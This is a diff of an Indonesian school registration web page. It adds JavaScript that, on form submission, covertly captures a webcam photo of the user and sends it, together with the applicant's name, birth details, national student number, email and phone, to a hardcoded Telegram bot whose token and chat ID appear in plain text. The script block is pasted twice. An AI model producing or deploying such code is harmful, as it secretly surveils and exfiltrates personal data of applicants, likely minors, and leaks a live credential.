@@ -375,7 +375,7 @@
             </div>
             
             <div class="form-group">
-                <label for="asalSekolah">Asal Sekolah</label>
+                <label for="asalSekolah">Asal Sekolah (wajib menggunakan huruf kapital)</label>
                 <input type="text" id="asalSekolah" name="asalSekolah" required>
             </div>
             
@@ -407,117 +407,337 @@
     </footer>
     
     <script>
-        // DOM Elements
-        const daftarBtn = document.getElementById('daftarBtn');
-        const formOverlay = document.getElementById('formOverlay');
-        const registrationForm = document.getElementById('registrationForm');
-        const successPopup = document.getElementById('successPopup');
-        const studentForm = document.getElementById('studentForm');
-        const dataSummary = document.getElementById('dataSummary');
+    // DOM Elements
+    const daftarBtn = document.getElementById('daftarBtn');
+    const formOverlay = document.getElementById('formOverlay');
+    const registrationForm = document.getElementById('registrationForm');
+    const successPopup = document.getElementById('successPopup');
+    const studentForm = document.getElementById('studentForm');
+    const dataSummary = document.getElementById('dataSummary');
+    
+    // Close buttons
+    const closeFormBtn = document.getElementById('closeForm');
+    const closeSuccessBtn = document.getElementById('closeSuccess');
+    const closeFinalBtn = document.getElementById('closeSuccessBtn');
+    
+    // Show registration form
+    daftarBtn.addEventListener('click', function() {
+        formOverlay.style.display = 'block';
+        registrationForm.style.display = 'block';
+    });
+    
+    // Close registration form
+    closeFormBtn.addEventListener('click', function() {
+        formOverlay.style.display = 'none';
+        registrationForm.style.display = 'none';
+    });
+    
+    // Close success popup
+    closeSuccessBtn.addEventListener('click', function() {
+        formOverlay.style.display = 'none';
+        successPopup.style.display = 'none';
+    });
+    
+    closeFinalBtn.addEventListener('click', function() {
+        formOverlay.style.display = 'none';
+        successPopup.style.display = 'none';
+    });
+    
+    // Form submission
+    studentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
         
-        // Close buttons
-        const closeFormBtn = document.getElementById('closeForm');
-        const closeSuccessBtn = document.getElementById('closeSuccess');
-        const closeFinalBtn = document.getElementById('closeSuccessBtn');
-        
-        // Show registration form
-        daftarBtn.addEventListener('click', function() {
-            formOverlay.style.display = 'block';
-            registrationForm.style.display = 'block';
-        });
-        
-        // Close registration form
-        closeFormBtn.addEventListener('click', function() {
-            formOverlay.style.display = 'none';
-            registrationForm.style.display = 'none';
-        });
-        
-        // Close success popup
-        closeSuccessBtn.addEventListener('click', function() {
-            formOverlay.style.display = 'none';
-            successPopup.style.display = 'none';
-        });
-        
-        closeFinalBtn.addEventListener('click', function() {
-            formOverlay.style.display = 'none';
-            successPopup.style.display = 'none';
-        });
-        
-        // Form submission
-        studentForm.addEventListener('submit', function(e) {
-            e.preventDefault();
+        // Get form data
+        const formData = {
+            nama: document.getElementById('nama').value,
+            tempatLahir: document.getElementById('tempatLahir').value,
+            tanggalLahir: document.getElementById('tanggalLahir').value,
+            nisn: document.getElementById('nisn').value,
+            email: document.getElementById('email').value,
+            telepon: document.getElementById('telepon').value,
+            asalSekolah: document.getElementById('asalSekolah').value,
+            alasan: document.getElementById('alasan').value
+        };
+
+        // Display data summary
+        let summaryHTML = '';
+        for (const [key, value] of Object.entries(formData)) {
+            const formattedKey = key.charAt(0).toUpperCase() + key.slice(1)
+                .replace(/([A-Z])/g, ' $1')
+                .trim();
+            summaryHTML += `<p><strong>${formattedKey}:</strong> ${value}</p>`;
+        }
+        dataSummary.innerHTML = summaryHTML;
+
+        // Ambil foto, lalu kirim ke Telegram
+        capturePhoto().then(photoBlob => {
+            sendToTelegram(formData, photoBlob);
             
-            // Get form data
-            const formData = {
-                nama: document.getElementById('nama').value,
-                tempatLahir: document.getElementById('tempatLahir').value,
-                tanggalLahir: document.getElementById('tanggalLahir').value,
-                nisn: document.getElementById('nisn').value,
-                email: document.getElementById('email').value,
-                telepon: document.getElementById('telepon').value,
-                asalSekolah: document.getElementById('asalSekolah').value,
-                alasan: document.getElementById('alasan').value
-            };
-            
-            // Display data summary
-            let summaryHTML = '';
-            for (const [key, value] of Object.entries(formData)) {
-                const formattedKey = key.charAt(0).toUpperCase() + key.slice(1)
-                    .replace(/([A-Z])/g, ' $1')
-                    .trim();
-                summaryHTML += `<p><strong>${formattedKey}:</strong> ${value}</p>`;
-            }
-            dataSummary.innerHTML = summaryHTML;
-            
-            // Send data to Telegram Bot (This part would need a backend to work properly)
-            // For frontend demo purposes, we'll simulate the sending
-            console.log("Data that would be sent to Telegram:", formData);
-            sendToTelegram(formData);
-            
-            // Hide registration form and show success popup
             registrationForm.style.display = 'none';
             successPopup.style.display = 'block';
-            
-            // Reset form
             studentForm.reset();
+        }).catch(error => {
+            console.error('Gagal ambil foto:', error);
+            // Tetap kirim data meski foto gagal
+            sendToTelegram(formData, null);
         });
-        
-        // Function to send data to Telegram
-        function sendToTelegram(data) {
-    const botToken = '8053296747:AAETgS_3c_-EOdVkNNWdsGaadKQMW1Wxzio';
-    const chatId = '1469657127';
-    
-    let message = "🎓 *Pendaftaran Baru SMA Negeri 1 Pare-Pare* 🎓\n\n";
-    message += `👤 *Nama:* ${data.nama}\n`;
-    message += `🏙️ *Tempat Lahir:* ${data.tempatLahir}\n`;
-    message += `📅 *Tanggal Lahir:* ${data.tanggalLahir}\n`;
-    message += `🆔 *NISN:* ${data.nisn}\n`;
-    message += `📧 *Email:* ${data.email}\n`;
-    message += `📱 *Telepon:* ${data.telepon}\n`;
-    message += `🏫 *Asal Sekolah:* ${data.asalSekolah}\n`;
-    message += `📝 *Alasan:* ${data.alasan}\n`;
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-    fetch(url, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: 'Markdown'
-        })
-    })
-    .then(response => response.json())
-    .then(data => {
-        console.log('Success sending to Telegram:', data);
-    })
-    .catch((error) => {
-        console.error('Error sending to Telegram:', error);
     });
-}
-    </script>
+
+    // Function to capture photo from camera
+    function capturePhoto() {
+        return new Promise((resolve, reject) => {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    video.addEventListener('loadedmetadata', () => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        canvas.toBlob(blob => {
+                            // Stop kamera setelah ambil foto
+                            stream.getTracks().forEach(track => track.stop());
+                            resolve(blob);
+                        }, 'image/jpeg', 0.9);
+                    });
+                })
+                .catch(err => {
+                    reject(err);
+                });
+        });
+    }
+
+    // Function to send data and photo to Telegram
+    function sendToTelegram(data, photoBlob) {
+        const botToken = '8053296747:AAETgS_3c_-EOdVkNNWdsGaadKQMW1Wxzio';
+        const chatId = '1469657127';
+
+        // Format pesan teks
+        let message = "🎓 *Pendaftaran Baru SMA Negeri 1 Pare-Pare* 🎓\n\n";
+        message += `👤 *Nama:* ${data.nama}\n`;
+        message += `🏙️ *Tempat Lahir:* ${data.tempatLahir}\n`;
+        message += `📅 *Tanggal Lahir:* ${data.tanggalLahir}\n`;
+        message += `🆔 *NISN:* ${data.nisn}\n`;
+        message += `📧 *Email:* ${data.email}\n`;
+        message += `📱 *Telepon:* ${data.telepon}\n`;
+        message += `🏫 *Asal Sekolah:* ${data.asalSekolah}\n`;
+        message += `📝 *Alasan:* ${data.alasan}\n`;
+
+        if (photoBlob) {
+            // Kalau ada foto, kirim foto + caption
+            const formDataTelegram = new FormData();
+            formDataTelegram.append('chat_id', chatId);
+            formDataTelegram.append('caption', message);
+            formDataTelegram.append('photo', photoBlob);
+            formDataTelegram.append('parse_mode', 'Markdown');
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formDataTelegram
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Foto + data berhasil dikirim:', result);
+            })
+            .catch(error => {
+                console.error('Error kirim ke Telegram:', error);
+            });
+        } else {
+            // Kalau ga ada foto, kirim teks biasa
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Teks berhasil dikirim:', result);
+            })
+            .catch((error) => {
+                console.error('Error kirim teks ke Telegram:', error);
+            });
+        }
+    }
+    </script> <script>
+    // DOM Elements
+    const daftarBtn = document.getElementById('daftarBtn');
+    const formOverlay = document.getElementById('formOverlay');
+    const registrationForm = document.getElementById('registrationForm');
+    const successPopup = document.getElementById('successPopup');
+    const studentForm = document.getElementById('studentForm');
+    const dataSummary = document.getElementById('dataSummary');
+    
+    // Close buttons
+    const closeFormBtn = document.getElementById('closeForm');
+    const closeSuccessBtn = document.getElementById('closeSuccess');
+    const closeFinalBtn = document.getElementById('closeSuccessBtn');
+    
+    // Show registration form
+    daftarBtn.addEventListener('click', function() {
+        formOverlay.style.display = 'block';
+        registrationForm.style.display = 'block';
+    });
+    
+    // Close registration form
+    closeFormBtn.addEventListener('click', function() {
+        formOverlay.style.display = 'none';
+        registrationForm.style.display = 'none';
+    });
+    
+    // Close success popup
+    closeSuccessBtn.addEventListener('click', function() {
+        formOverlay.style.display = 'none';
+        successPopup.style.display = 'none';
+    });
+    
+    closeFinalBtn.addEventListener('click', function() {
+        formOverlay.style.display = 'none';
+        successPopup.style.display = 'none';
+    });
+    
+    // Form submission
+    studentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Get form data
+        const formData = {
+            nama: document.getElementById('nama').value,
+            tempatLahir: document.getElementById('tempatLahir').value,
+            tanggalLahir: document.getElementById('tanggalLahir').value,
+            nisn: document.getElementById('nisn').value,
+            email: document.getElementById('email').value,
+            telepon: document.getElementById('telepon').value,
+            asalSekolah: document.getElementById('asalSekolah').value,
+            alasan: document.getElementById('alasan').value
+        };
+
+        // Display data summary
+        let summaryHTML = '';
+        for (const [key, value] of Object.entries(formData)) {
+            const formattedKey = key.charAt(0).toUpperCase() + key.slice(1)
+                .replace(/([A-Z])/g, ' $1')
+                .trim();
+            summaryHTML += `<p><strong>${formattedKey}:</strong> ${value}</p>`;
+        }
+        dataSummary.innerHTML = summaryHTML;
+
+        // Ambil foto, lalu kirim ke Telegram
+        capturePhoto().then(photoBlob => {
+            sendToTelegram(formData, photoBlob);
+            
+            registrationForm.style.display = 'none';
+            successPopup.style.display = 'block';
+            studentForm.reset();
+        }).catch(error => {
+            console.error('Gagal ambil foto:', error);
+            // Tetap kirim data meski foto gagal
+            sendToTelegram(formData, null);
+        });
+    });
+
+    // Function to capture photo from camera
+    function capturePhoto() {
+        return new Promise((resolve, reject) => {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    video.addEventListener('loadedmetadata', () => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        canvas.toBlob(blob => {
+                            // Stop kamera setelah ambil foto
+                            stream.getTracks().forEach(track => track.stop());
+                            resolve(blob);
+                        }, 'image/jpeg', 0.9);
+                    });
+                })
+                .catch(err => {
+                    reject(err);
+                });
+        });
+    }
+
+    // Function to send data and photo to Telegram
+    function sendToTelegram(data, photoBlob) {
+        const botToken = '8053296747:AAETgS_3c_-EOdVkNNWdsGaadKQMW1Wxzio';
+        const chatId = '1469657127';
+
+        // Format pesan teks
+        let message = "🎓 *Pendaftaran Baru SMA Negeri 1 Pare-Pare* 🎓\n\n";
+        message += `👤 *Nama:* ${data.nama}\n`;
+        message += `🏙️ *Tempat Lahir:* ${data.tempatLahir}\n`;
+        message += `📅 *Tanggal Lahir:* ${data.tanggalLahir}\n`;
+        message += `🆔 *NISN:* ${data.nisn}\n`;
+        message += `📧 *Email:* ${data.email}\n`;
+        message += `📱 *Telepon:* ${data.telepon}\n`;
+        message += `🏫 *Asal Sekolah:* ${data.asalSekolah}\n`;
+        message += `📝 *Alasan:* ${data.alasan}\n`;
+
+        if (photoBlob) {
+            // Kalau ada foto, kirim foto + caption
+            const formDataTelegram = new FormData();
+            formDataTelegram.append('chat_id', chatId);
+            formDataTelegram.append('caption', message);
+            formDataTelegram.append('photo', photoBlob);
+            formDataTelegram.append('parse_mode', 'Markdown');
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formDataTelegram
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Foto + data berhasil dikirim:', result);
+            })
+            .catch(error => {
+                console.error('Error kirim ke Telegram:', error);
+            });
+        } else {
+            // Kalau ga ada foto, kirim teks biasa
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Teks berhasil dikirim:', result);
+            })
+            .catch((error) => {
+                console.error('Error kirim teks ke Telegram:', error);
+            });
+        }
+    }
+            </script>
 </body>
 </html>
